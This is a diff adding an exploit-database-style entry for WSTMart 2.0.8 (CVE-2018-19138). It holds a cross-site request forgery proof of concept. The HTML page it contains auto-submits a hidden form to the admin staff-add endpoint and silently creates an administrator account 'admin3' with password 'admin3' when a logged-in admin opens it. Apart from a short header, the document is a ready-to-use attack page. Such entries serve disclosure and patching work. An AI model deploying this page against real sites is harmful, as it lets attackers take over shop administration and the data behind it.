@@ -1,0 +1,51 @@
+# Exploit Title:  WSTMart 2.0.8 - Cross-Site Request Forgery (Add Admin)
+# Date: 2018-12-23
+# Exploit Author: linfeng
+# Vendor Homepage:https://github.com/wstmall/wstmart/
+# Software Link:http://www.wstmart.net/
+# Version:  WSTMart 2.0.8_181212  
+# CVE :CVE-2018-19138
+
+# 0x02 CSRF PoC
+# 18/5000
+# Function point: background management - staff management - login account
+# poc:
+# 1234.html
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+ <title>Document</title>
+</head>
+<body>
+	<form action="http://xx.xx.xx.xx/st/wstmart_v2.0.8_181212/index.php/admin/staffs/add.html" id="test" name='test' method="POST">
+		<input type="hidden" name='staffId' value="" />
+		<input type="hidden" name='loginName' value="" />
+		<input type="hidden" name='staffPhoto' value="" />
+		<input type="hidden" name='loginPwd' value="" />
+		<input type="hidden" name='staffName' value="" />
+		<input type="hidden" name='staffNo' value="" />  
+		<input type="hidden" name='RoleId' value="" />
+		<input type="hidden" name='staffPhone' value="" />
+		<input type="hidden" name='wxOpenId' value="" />
+		<input type="hidden" name='workStatus' value="" />
+		<input type="hidden" name='staffStatus' value="" />
+	</form>
+
+<script type="text/javascript">
+test.staffId.value="0";
+test.loginName.value="admin3";
+test.staffPhoto.value="";  
+test.loginPwd.value="admin3";
+test.staffName.value="admin3";
+test.staffNo.value=""; 
+test.RoleId.value="0";
+test.staffPhone.value="";
+test.wxOpenId.value="";
+test.workStatus.value="1";
+test.staffStatus.value="1";
+test.submit();
+</script>
+</body>
+</html>
